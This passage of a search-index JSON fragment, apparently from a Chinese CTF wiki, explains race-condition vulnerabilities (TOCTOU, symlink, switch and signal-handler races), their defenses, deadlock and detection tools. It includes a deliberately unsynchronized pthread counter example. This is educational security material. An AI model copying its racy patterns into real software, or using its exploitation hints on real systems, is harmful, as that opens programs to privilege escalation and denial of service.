\u867d\u7136\u8fd9\u4e2a\u65f6\u95f4\u7684\u95f4\u9694\u53ef\u80fd\u975e\u5e38\u5c0f\uff0c\u4f46\u662f\u653b\u51fb\u8005\u4ecd\u7136\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff08\u5982\u8ba1\u7b97\u5bc6\u96c6\u578b\u64cd\u4f5c\uff0cDos\u653b\u51fb\uff09\u4f7f\u5f97\u53d7\u5bb3\u673a\u5668\u7684\u5904\u7406\u901f\u5ea6\u53d8\u5f97\u76f8\u5bf9\u6162\u4e00\u4e9b\u3002 \u5f62\u5f0f \u00b6 \u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u6709\u4ee5\u4e0b\u5f62\u5f0f\u3002 CWE-367: TOCTOU Race Condition \u00b6 \u63cf\u8ff0 \u00b6 TOCTOC (Time-of-check Time-of-use) \u6307\u7684\u662f\u7a0b\u5e8f\u5728\u4f7f\u7528\u8d44\u6e90\uff08\u53d8\u91cf\uff0c\u5185\u5b58\uff0c\u6587\u4ef6\uff09\u524d\u4f1a\u5bf9\u8fdb\u884c\u68c0\u67e5\uff0c\u4f46\u662f\u5728\u7a0b\u5e8f\u4f7f\u7528\u5bf9\u5e94\u7684\u8d44\u6e90\u524d\uff0c\u8be5\u8d44\u6e90\u5374\u88ab\u4fee\u6539\u4e86\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e9b\u66f4\u52a0\u5177\u4f53\u7684\u4f8b\u5b50\u3002 CWE-365: Race Condition in Switch \u00b6 \u5f53\u7a0b\u5e8f\u6b63\u5728\u6267\u884c switch \u8bed\u53e5\u65f6\uff0c\u5982\u679c switch \u53d8\u91cf\u7684\u503c\u88ab\u6539\u53d8\uff0c\u90a3\u4e48\u5c31\u53ef\u80fd\u9020\u6210\u4e0d\u53ef\u9884\u77e5\u7684\u884c\u4e3a\u3002\u5c24\u5176\u5728case \u8bed\u53e5\u540e\u4e0d\u5199 break \u8bed\u53e5\u7684\u4ee3\u7801\uff0c\u4e00\u65e6 switch \u53d8\u91cf\u53d1\u751f\u6539\u53d8\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u6539\u53d8\u7a0b\u5e8f\u539f\u6709\u7684\u903b\u8f91\u3002 CWE-363: Race Condition Enabling Link Following \u00b6 \u6211\u4eec\u77e5\u9053 Linux \u4e2d\u63d0\u4f9b\u4e86\u4e24\u79cd\u5bf9\u4e8e\u6587\u4ef6\u7684\u547d\u540d\u65b9\u5f0f \u6587\u4ef6\u8def\u5f84\u540d \u6587\u4ef6\u63cf\u8ff0\u7b26 \u4f46\u662f\uff0c\u5c06\u8fd9\u4e24\u79cd\u547d\u540d\u89e3\u6790\u5230\u76f8\u5e94\u5bf9\u8c61\u4e0a\u7684\u65b9\u5f0f\u6709\u6240\u4e0d\u540c \u6587\u4ef6\u8def\u5f84\u540d\u5728\u89e3\u6790\u7684\u65f6\u5019\u662f\u901a\u8fc7\u4f20\u5165\u7684\u8def\u5f84\uff08\u6587\u4ef6\u540d\uff0c\u786c\u94fe\u63a5\uff0c\u8f6f\u8fde\u63a5\uff09 \u95f4\u63a5\u89e3\u6790 \u7684\uff0c\u5176\u4f20\u5165\u7684\u53c2\u6570\u5e76\u4e0d\u662f\u76f8\u5e94\u6587\u4ef6\u7684\u771f\u5b9e\u5730\u5740(inode)\u3002 \u6587\u4ef6\u63cf\u8ff0\u7b26\u901a\u8fc7\u8bbf\u95ee\u76f4\u63a5\u6307\u5411\u6587\u4ef6\u7684\u6307\u9488\u6765\u89e3\u6790\u3002 \u6b63\u662f\u7531\u4e8e\u95f4\u63a5\u6027\uff0c\u4ea7\u751f\u4e86\u4e0a\u9762\u6211\u4eec\u6240\u8bf4\u7684\u65f6\u95f4\u7a97\u53e3\u3002 \u4ee5\u4e0b\u9762\u7684\u4ee3\u7801\u4e3a\u4f8b\u5b50\uff0c\u7a0b\u5e8f\u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u4e4b\u524d\uff0c\u4f1a\u68c0\u67e5\u662f\u5426\u5b58\u5728\uff0c\u4e4b\u540e\u4f1a\u6253\u5f00\u6587\u4ef6\u7136\u540e\u6267\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5982\u679c\u5728\u68c0\u67e5\u4e4b\u540e\uff0c\u771f\u6b63\u4f7f\u7528\u6587\u4ef6\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u5c06\u6587\u4ef6\u4fee\u6539\u4e3a\u67d0\u4e2a\u7b26\u53f7\u94fe\u63a5\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c06\u8bbf\u95ee\u9519\u8bef\u7684\u6587\u4ef6\u3002 \u8fd9\u79cd\u6761\u4ef6\u7ade\u4e89\u51fa\u73b0\u7684\u95ee\u9898\u7684\u6839\u6e90\u5728\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u540d\u5b57\u5bf9\u8c61\u7ed1\u5b9a\u7684\u95ee\u9898\u3002\u800c\u4e0b\u9762\u7684\u51fd\u6570\u90fd\u4f1a\u4f7f\u7528\u6587\u4ef6\u540d\u4f5c\u4e3a\u53c2\u6570\uff1aaccess(), open(), creat(), mkdir(), unlink(), rmdir(), chown(), symlink(), link(), rename(), chroot(),\u2026 \u90a3\u8be5\u5982\u4f55\u907f\u514d\u8fd9\u4e2a\u95ee\u9898\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 fstat \u51fd\u6570\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u4fe1\u606f\u5e76\u628a\u5b83\u5b58\u5165\u5230stat\u7ed3\u6784\u4f53\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u4fe1\u606f\u4e0e\u6211\u4eec\u5df2\u77e5\u7684\u4fe1\u606f\u8fdb\u884c\u6bd4\u8f83\u6765\u5224\u65ad\u6211\u4eec\u662f\u5426\u8bfb\u5165\u4e86\u6b63\u786e\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cstat\u7ed3\u6784\u4f53\u4e2d\u7684 st_ino \u548c st_dev \u53d8\u91cf\u53ef\u4ee5\u552f\u4e00\u8868\u793a\u6587\u4ef6 st_ino \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u7684\u5e8f\u5217\u53f7\uff0c\u5373 i-node st_dev \uff0c\u5305\u542b\u4e86\u6587\u4ef6\u5bf9\u5e94\u7684\u8bbe\u5907\u3002 CWE-364: Signal Handler Race Condition \u00b6 \u6982\u8ff0 \u00b6 \u6761\u4ef6\u7ade\u4e89\u7ecf\u5e38\u4f1a\u53d1\u751f\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\uff0c\u8fd9\u662f\u56e0\u4e3a\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u652f\u6301\u5f02\u6b65\u64cd\u4f5c\u3002\u5c24\u5176\u662f\u5f53\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u662f \u4e0d\u53ef\u91cd\u5165 \u7684\u6216\u8005\u72b6\u6001\u654f\u611f\u7684\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u5229\u7528\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u7684\u6761\u4ef6\u7ade\u4e89\uff0c\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u548c\u4ee3\u7801\u6267\u884c\u7684\u6548\u679c\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u5728\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u6267\u884c\u4e86free\u64cd\u4f5c\uff0c\u6b64\u65f6\u53c8\u6765\u4e86\u4e00\u4e2a\u4fe1\u53f7\uff0c\u7136\u540e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u5c31\u4f1a\u518d\u6b21\u6267\u884cfree\u64cd\u4f5c\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0 double free \u7684\u60c5\u51b5\uff0c\u518d\u7a0d\u5fae\u64cd\u4f5c\u4e00\u4e0b\uff0c\u5c31\u53ef\u80fd\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u4e86\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u6709\u5173\u7684\u5e38\u89c1\u7684\u6761\u4ef6\u7ade\u4e89\u60c5\u51b5\u6709 \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u548c\u666e\u901a\u7684\u4ee3\u7801\u6bb5\u5171\u4eab\u5168\u5c40\u53d8\u91cf\u548c\u6570\u636e\u6bb5\u3002 \u5728\u4e0d\u540c\u7684\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u5171\u4eab\u72b6\u6001\u3002 \u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4f7f\u7528\u4e0d\u53ef\u91cd\u5165\u7684\u51fd\u6570\uff0c\u6bd4\u5982 malloc \u548c free \u3002 \u4e00\u4e2a\u4fe1\u53f7\u5904\u7406\u51fd\u6570\u5904\u7406\u591a\u4e2a\u4fe1\u53f7\uff0c\u8fd9\u53ef\u80fd\u4f1a\u8fdb\u800c\u5bfc\u81f4use after free \u548c double free \u6f0f\u6d1e\u3002 \u4f7f\u7528 setjmp \u6216\u8005 longjmp \u7b49\u673a\u5236\u6765\u4f7f\u5f97\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e0d\u80fd\u591f\u8fd4\u56de\u539f\u6765\u7684\u7a0b\u5e8f\u6267\u884c\u6d41\u3002 \u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165 \u00b6 \u8fd9\u91cc\u8bf4\u660e\u4e00\u4e0b\u7ebf\u7a0b\u5b89\u5168\u4e0e\u53ef\u91cd\u5165\u7684\u5173\u7cfb\u3002 \u7ebf\u7a0b\u5b89\u5168 \u5373\u8be5\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u7ebf\u7a0b\u8c03\u7528\uff0c\u800c\u4e0d\u4f1a\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u3002 \u6761\u4ef6 \u672c\u8eab\u6ca1\u6709\u4efb\u4f55\u5171\u4eab\u8d44\u6e90 \u6709\u5171\u4eab\u8d44\u6e90\uff0c\u9700\u8981\u52a0\u9501\u3002 \u53ef\u91cd\u7528 \u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u88ab\u591a\u4e2a\u5b9e\u4f8b\u53ef\u4ee5\u540c\u65f6\u8fd0\u884c\u5728\u76f8\u540c\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\u3002 \u53ef\u91cd\u5165\u51fd\u6570\u53ef\u4ee5\u88ab\u4e2d\u65ad\uff0c\u5e76\u4e14\u5176\u5b83\u4ee3\u7801\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u65f6\uff0c\u4e0d\u4f1a\u4e22\u5931\u6570\u636e\u7684\u5b8c\u6574\u6027\u3002\u6240\u4ee5\u53ef\u91cd\u5165\u51fd\u6570\u4e00\u5b9a\u662f\u7ebf\u7a0b\u5b89\u5168\u7684\u3002 \u53ef\u91cd\u5165\u5f3a\u8c03\u7684\u662f\u5355\u4e2a\u7ebf\u7a0b\u6267\u884c\u65f6\uff0c\u91cd\u65b0\u8fdb\u5165\u540c\u4e00\u4e2a\u5b50\u7a0b\u5e8f\u4ecd\u7136\u662f\u5b89\u5168\u7684\u3002 \u4e0d\u6ee1\u8db3\u6761\u4ef6 \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86\u9759\u6001\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u4e14\u4e0d\u662f\u5e38\u91cf \u51fd\u6570\u4f53\u5185\u4f7f\u7528\u4e86malloc \u6216\u8005 free \u51fd\u6570 \u51fd\u6570\u4f7f\u7528\u4e86\u6807\u51c6 IO \u51fd\u6570\u3002 \u8c03\u7528\u7684\u51fd\u6570\u4e0d\u662f\u53ef\u91cd\u5165\u7684\u3002 \u53ef\u91cd\u5165\u51fd\u6570\u4f7f\u7528\u7684\u6240\u6709\u53d8\u91cf\u90fd\u4fdd\u5b58\u5728 \u8c03\u7528\u6808 \u7684\u5f53\u524d \u51fd\u6570\u6808 \uff08frame\uff09\u4e0a\u3002 \u9632\u8303 \u00b6 \u5982\u679c\u60f3\u8981\u6d88\u9664\u6761\u4ef6\u7ade\u4e89\uff0c\u90a3\u4e48\u9996\u8981\u7684\u76ee\u6807\u662f\u627e\u5230\u7ade\u4e89\u7a97\u53e3\uff08race windows\uff09\u3002 \u6240\u8c13\u7ade\u4e89\u7a97\u53e3\uff0c\u5c31\u662f\u8bbf\u95ee\u7ade\u4e89\u5bf9\u8c61\u7684\u4ee3\u7801\u6bb5\uff0c\u8fd9\u7ed9\u653b\u51fb\u8005\u76f8\u5e94\u7684\u673a\u4f1a\u6765\u4fee\u6539\u76f8\u5e94\u7684\u7ade\u4e89\u5bf9\u8c61\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u4f7f\u5f97\u51b2\u7a81\u7684\u7ade\u4e89\u7a97\u53e3\u76f8\u4e92\u6392\u65a5\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002 \u540c\u6b65\u539f\u8bed \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u540c\u6b65\u539f\u8bed\u6765\u6d88\u9664\u7ade\u4e89\u6761\u4ef6\u3002\u5e38\u89c1\u7684\u5982\u4e0b \u9501\u53d8\u91cf \u901a\u5e38\u4e92\u65a5\u7410\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u653e\u5f03CPU\uff0c\u8fdb\u5165idle\u72b6\u6001\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u81ea\u52a8\u5c1d\u8bd5\u3002 \u81ea\u65cb\u9501\uff08spinlock\uff09\uff0c\u5728\u7b49\u5f85\u671f\u95f4\u4e0d\u653e\u5f03CPU\uff0c\u4e00\u76f4\u5c1d\u8bd5\u3002 \u6761\u4ef6\u53d8\u91cf \u6761\u4ef6\u53d8\u91cf\u662f\u7528\u6765\u7b49\u5f85\u800c\u4e0d\u662f\u7528\u6765\u4e0a\u9501\u7684\u3002\u6761\u4ef6\u53d8\u91cf\u7528\u6765\u81ea\u52a8\u963b\u585e\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u76f4\u5230\u67d0\u7279\u6b8a\u60c5\u51b5\u53d1\u751f\u4e3a\u6b62\u3002\u901a\u5e38\u6761\u4ef6\u53d8\u91cf\u548c\u4e92\u65a5\u9501\u540c\u65f6\u4f7f\u7528\u3002 \u4e34\u754c\u533a\u5bf9\u8c61\uff0cCRITICAL_SECTION \u4fe1\u53f7\u91cf\uff08semaphore\uff09\uff0c\u63a7\u5236\u53ef\u8bbf\u95ee\u67d0\u4e2a\u4e34\u754c\u533a\u7684\u7ebf\u7a0b\u6570\u91cf\uff0c\u4e00\u822c\u6bd41\u5927\u3002 \u7ba1\u9053\uff0c\u6307\u7528\u4e8e\u8fde\u63a5\u4e00\u4e2a\u8bfb\u8fdb\u7a0b\u548c\u4e00\u4e2a\u5199\u8fdb\u7a0b\u4ee5\u5b9e\u73b0\u5b83\u4eec\u4e4b\u95f4\u901a\u4fe1\u7684\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u3002\u5176\u751f\u5b58\u671f\u4e0d\u8d85\u8fc7\u521b\u5efa\u7ba1\u9053\u7684\u8fdb\u7a0b\u7684\u751f\u5b58\u671f\u3002 \u547d\u540d\u7ba1\u9053\uff0c\u751f\u5b58\u671f\u53ef\u4ee5\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u671f\u4e00\u6837\u957f\u3002 # \u521b\u5efa\u7ba1\u9053 mkfifo my_pipe # gzip\u4ece\u7ed9\u5b9a\u7684\u7ba1\u9053\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u5e76\u628a\u6570\u636e\u538b\u7f29\u5230out.gz\u4e2d gzip -9 -c < my_pipe > out.gz & # \u7ed9\u7ba1\u9053\u4f20\u8f93\u6570\u636e cat file > my_pipe \u6b7b\u9501 \u00b6 \u6982\u8ff0 \u00b6 \u5f53\u540c\u6b65\u539f\u8bed\u4f7f\u7528\u7684\u4e0d\u6070\u5f53\u7684\u65f6\u5019\uff0c\u8fdb\u7a0b\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6b7b\u9501\u3002\u5f53\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u6267\u884c\u6d41\u4e92\u76f8\u963b\u585e\u5bfc\u81f4\u90fd\u4e0d\u80fd\u7ee7\u7eed\u6267\u884c\uff0c\u6b7b\u9501\u5c31\u4f1a\u53d1\u751f\u3002\u5176\u5b9e\uff0c\u6b7b\u9501\u4e3b\u8981\u662f\u56e0\u4e3a\u5728\u51b2\u7a81\u7684\u6267\u884c\u6d41\u4e2d\uff0c\u51fa\u73b0\u4e86\u5faa\u73af\u7b49\u5f85\u7684\u6267\u884c\u6d41\uff0c\u5373\u5faa\u73af\u7b49\u5f85\u4e2d\u7684\u6bcf\u4e00\u4e2a\u6267\u884c\u6d41\u90fd\u83b7\u5f97\u4e00\u4e2a\u8d44\u6e90\uff0c\u540c\u65f6\u8bd5\u56fe\u83b7\u5f97\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002\u4e0b\u56fe\u6240\u793a\uff0cP1\u3001P2 \u4e24\u4e2a\u8fdb\u7a0b\u90fd\u9700\u8981\u8d44\u6e90\u624d\u80fd\u7ee7\u7eed\u8fd0\u884c\u3002P1 \u62e5\u6709\u8d44\u6e90 R2\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R1 \u624d\u80fd\u8fd0\u884c\uff1bP2 \u62e5\u6709\u8d44\u6e90 R1\u3001\u8fd8\u9700\u8981\u989d\u5916\u8d44\u6e90 R2 \u624d\u80fd\u8fd0\u884c\uff0c\u4e24\u8fb9\u90fd\u5728\u4e92\u76f8\u7b49\u5f85\u800c\u6ca1\u6709\u4efb\u4f55\u4e00\u4e2a\u53ef\u8fd0\u884c\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6b7b\u9501\u6709\u4ee5\u4e0b\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6 \u4e92\u65a5\uff0c\u8d44\u6e90\u662f\u4e92\u65a5\u7684\u3002 \u6301\u6709\u548c\u7b49\u5f85\uff0c\u6301\u6709\u5df2\u6709\u7684\u8d44\u6e90\uff0c\u540c\u65f6\u7b49\u5f85\u4f7f\u7528\u4e0b\u4e00\u4e2a\u8d44\u6e90\u3002 \u4e0d\u53ef\u62a2\u5360\uff0c\u8fdb\u7a0b\u6240\u83b7\u5f97\u7684\u8d44\u6e90\u5728\u672a\u4f7f\u7528\u5b8c\u6bd5\u4e4b\u524d\uff0c\u8d44\u6e90\u7533\u8bf7\u8005\u4e0d\u80fd\u5f3a\u884c\u5730\u4ece\u8d44\u6e90\u5360\u6709\u8005\u624b\u4e2d\u593a\u53d6\u8d44\u6e90\uff0c\u800c\u53ea\u80fd\u7531\u8be5\u8d44\u6e90\u7684\u5360\u6709\u8005\u8fdb\u7a0b\u81ea\u884c\u91ca\u653e\u3002 \u5faa\u73af\u7b49\u5f85\uff0c\u5faa\u73af\u7b49\u5f85\u8d44\u6e90\u3002 \u800c\u5982\u679c\u60f3\u8981\u6d88\u9664\u6b7b\u9501\uff0c\u4e5f\u5c31\u662f\u6253\u7834\u4e0a\u9762\u7684\u56db\u4e2a\u5fc5\u8981\u6761\u4ef6\u3002 \u6b64\u5916\uff0c\u6b7b\u9501\u53ef\u80fd\u6765\u6e90\u4e8e\u4ee5\u4e0b\u7684\u539f\u56e0 \u5904\u7406\u5668\u901f\u5ea6 \u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u8c03\u5ea6\u7b97\u6cd5\u7684\u53d8\u52a8 \u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u540c\u5185\u5b58\u7684\u9650\u5236\u3002 \u4efb\u4f55\u80fd\u591f\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u7684\u5f02\u6b65\u4e8b\u4ef6\u3002 \u5f71\u54cd \u00b6 \u6b7b\u9501\u4e00\u822c\u60c5\u51b5\u4e0b\u4f1a\u9020\u6210\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 \u68c0\u6d4b \u00b6 \u90a3\u4e48\uff0c\u8bf4\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u6765\u68c0\u6d4b\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u5462\uff1f\u76ee\u524d\u4e5f\u786e\u5b9e\u6709\u8fd9\u65b9\u9762\u7684\u7814\u7a76\uff0c\u4e5f\u662f\u4e3b\u8981\u4ece\u9759\u6001\u5206\u6790\u548c\u52a8\u6001\u5206\u6790\u4e24\u4e2a\u65b9\u9762\u6765\u68c0\u6d4b\u3002 \u9759\u6001\u68c0\u6d4b \u00b6 \u76ee\u524d\u5df2\u77e5\u7684\u9759\u6001\u68c0\u6d4b\u5de5\u5177\u6709 Flawfinder \u76ee\u6807\uff1aC/C++\u6e90\u7801 \u6b65\u9aa4 \u5efa\u7acb\u6f0f\u6d1e\u6570\u636e\u5e93 \u8fdb\u884c\u7b80\u5355\u7684\u6587\u672c\u6a21\u5f0f\u5339\u914d\uff0c\u6ca1\u6709\u4efb\u4f55\u7684\u6570\u636e\u6d41\u6216\u63a7\u5236\u6d41\u5206\u6790 ThreadSanitizer \u76ee\u6807\uff1aC++\u548cGO \u5b9e\u73b0\uff1aLLVM \u52a8\u6001\u68c0\u6d4b \u00b6 Intel Inspector Valgrind \u53c2\u8003 \u00b6 http://www.teraits.com/pitagoras/marcio/segapp/05.ppt http://repository.root-me.org/Programmation/C%20-%20C++/EN%20-%20Secure%20Coding%20in%20C%20and%20C++%20Race%20Conditions.pdf https://www.blackhat.com/presentations/bh-europe-04/bh-eu-04-tsyrklevich/bh-eu-04-tsyrklevich.pdf https://xinhuang.github.io/posts/2014-09-23-detect-race-condition-using-clang-thread-sanitizer.html https://llvm.org/devmtg/2011-11/Hutchins_ThreadSafety.pdf http://www.cnblogs.com/biyeymyhjob/archive/2012/07/20/2601655.html http://www.cnblogs.com/huxiao-tee/p/4660352.html https://github.com/dirtycow/dirtycow.github.io","title":"\u6761\u4ef6\u7ade\u4e89\u4ecb\u7ecd"},{"location":"pwn/race-condition/introduction/#race-condition","text":"","title":"Race Condition"},{"location":"pwn/race-condition/introduction/#_1","text":"\u6761\u4ef6\u7ade\u4e89\u662f\u6307\u4e00\u4e2a\u7cfb\u7edf\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u7684\u5148\u540e\u987a\u5e8f\u3002\u5f53\u8fd9\u4e9b\u4e0d\u53d7\u63a7\u5236\u7684\u4e8b\u4ef6\u5e76\u6ca1\u6709\u6309\u7167\u5f00\u53d1\u8005\u60f3\u8981\u7684\u65b9\u5f0f\u8fd0\u884c\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0 bug\u3002\u8fd9\u4e2a\u672f\u8bed\u6700\u521d\u6765\u81ea\u4e8e\u4e24\u4e2a\u7535\u4fe1\u53f7\u4e92\u76f8\u7ade\u4e89\u6765\u5f71\u54cd\u8f93\u51fa\u7ed3\u679c\u3002 \u6761\u4ef6\u7ade\u4e89\u4e3b\u8981\u51fa\u73b0\u5728\u5982\u4e0b\u9886\u57df \u7535\u5b50\u7cfb\u7edf\uff0c\u5c24\u5176\u662f\u903b\u8f91\u7535\u8def \u8ba1\u7b97\u673a\uff0c\u5c24\u5176\u662f\u591a\u7ebf\u7a0b\u7a0b\u5e8f\u548c\u5206\u5e03\u5f0f\u7a0b\u5e8f\u3002 \u7531\u4e8e\u76ee\u524d\u7684\u7cfb\u7edf\u4e2d\u5927\u91cf\u91c7\u7528\u5e76\u53d1\u7f16\u7a0b\uff0c\u7ecf\u5e38\u5bf9\u8d44\u6e90\u8fdb\u884c\u5171\u4eab\uff0c\u5f80\u5f80\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u3002 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u8003\u8651\u8ba1\u7b97\u673a\u7a0b\u5e8f\u65b9\u9762\u7684\u6761\u4ef6\u7ade\u4e89\u3002\u5f53\u4e00\u4e2a\u8f6f\u4ef6\u7684\u8fd0\u884c\u7ed3\u679c\u4f9d\u8d56\u4e8e\u8fdb\u7a0b\u6216\u8005\u7ebf\u7a0b\u7684\u987a\u5e8f\u65f6\uff0c\u5c31\u53ef\u80fd\u4f1a\u51fa\u73b0\u6761\u4ef6\u7ade\u4e89\u3002\u7b80\u5355\u8003\u8651\u4e00\u4e0b\uff0c\u53ef\u4ee5\u77e5\u9053\u6761\u4ef6\u7ade\u4e89\u9700\u8981\u5982\u4e0b\u7684 \u6761\u4ef6 \uff1a \u5e76\u53d1\uff0c\u5373\u81f3\u5c11\u5b58\u5728\u4e24\u4e2a\u5e76\u53d1\u6267\u884c\u6d41\u3002\u8fd9\u91cc\u7684\u6267\u884c\u6d41\u5305\u62ec\u7ebf\u7a0b\uff0c\u8fdb\u7a0b\uff0c\u4efb\u52a1\u7b49\u7ea7\u522b\u7684\u6267\u884c\u6d41\u3002 \u5171\u4eab\u5bf9\u8c61\uff0c\u5373\u591a\u4e2a\u5e76\u53d1\u6d41\u4f1a\u8bbf\u95ee\u540c\u4e00\u5bf9\u8c61\u3002 \u5e38\u89c1\u7684\u5171\u4eab\u5bf9\u8c61\u6709\u5171\u4eab\u5185\u5b58\uff0c\u6587\u4ef6\u7cfb\u7edf\uff0c\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e9b\u5171\u4eab\u5bf9\u8c61\u662f\u7528\u6765\u4f7f\u5f97\u591a\u4e2a\u7a0b\u5e8f\u6267\u884c\u6d41\u76f8\u4e92\u4ea4\u6d41\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u79f0\u8bbf\u95ee\u5171\u4eab\u5bf9\u8c61\u7684\u4ee3\u7801\u4e3a \u4e34\u754c\u533a \u3002\u5728\u6b63\u5e38\u5199\u4ee3\u7801\u65f6\uff0c\u8fd9\u90e8\u5206\u5e94\u8be5\u52a0\u9501\u3002 \u6539\u53d8\u5bf9\u8c61\uff0c\u5373\u81f3\u5c11\u6709\u4e00\u4e2a\u63a7\u5236\u6d41\u4f1a\u6539\u53d8\u7ade\u4e89\u5bf9\u8c61\u7684\u72b6\u6001\u3002\u56e0\u4e3a\u5982\u679c\u7a0b\u5e8f\u53ea\u662f\u5bf9\u5bf9\u8c61\u8fdb\u884c\u8bfb\u64cd\u4f5c\uff0c\u90a3\u4e48\u5e76\u4e0d\u4f1a\u4ea7\u751f\u6761\u4ef6\u7ade\u4e89\u3002 \u7531\u4e8e\u5728\u5e76\u53d1\u65f6\uff0c\u6267\u884c\u6d41\u7684\u4e0d\u786e\u5b9a\u6027\u5f88\u5927\uff0c\u6761\u4ef6\u7ade\u4e89\u76f8\u5bf9 \u96be\u5bdf\u89c9 \uff0c\u5e76\u4e14\u5728 \u590d\u73b0\u548c\u8c03\u8bd5\u65b9\u9762\u4f1a\u6bd4\u8f83\u56f0\u96be \u3002\u8fd9\u7ed9\u4fee\u590d\u6761\u4ef6\u7ade\u4e89\u4e5f\u5e26\u6765\u4e86\u4e0d\u5c0f\u7684\u56f0\u96be\u3002 \u6761\u4ef6\u7ade\u4e89\u9020\u6210\u7684\u5f71\u54cd\u4e5f\u662f\u591a\u6837\u7684\uff0c\u8f7b\u5219\u7a0b\u5e8f\u5f02\u5e38\u6267\u884c\uff0c\u91cd\u5219\u7a0b\u5e8f\u5d29\u6e83\u3002\u5982\u679c\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\u88ab\u653b\u51fb\u8005\u5229\u7528\u7684\u8bdd\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u4f7f\u5f97\u653b\u51fb\u8005\u83b7\u5f97\u76f8\u5e94\u7cfb\u7edf\u7684\u7279\u6743\u3002 \u8fd9\u91cc\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002 #include <pthread.h> #include <stdio.h> int counter ; void * IncreaseCounter ( void * args ) { counter += 1 ; sleep ( 0.1 ); printf ( \"Thread %d has counter value %d \\n \" , ( unsigned int ) pthread_self (), counter ); } int main () { pthread_t p [ 10 ]; for ( int i = 0 ; i < 10 ; ++ i ) { pthread_create ( & p [ i ], NULL , IncreaseCounter , NULL ); } for ( int i = 0 ; i < 10 ; ++ i ) { pthread_join ( p [ i ], NULL ); } return 0 ; } \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u80fd\u5e0c\u671b\u6309\u5982\u4e0b\u65b9\u5f0f\u8f93\u51fa \u279c 005race_condition ./example1 Thread 1859024640 has counter value 1 Thread 1841583872 has counter value 2 Thread 1832863488 has counter value 3 Thread 1824143104 has counter value 4 Thread 1744828160 has counter value 5 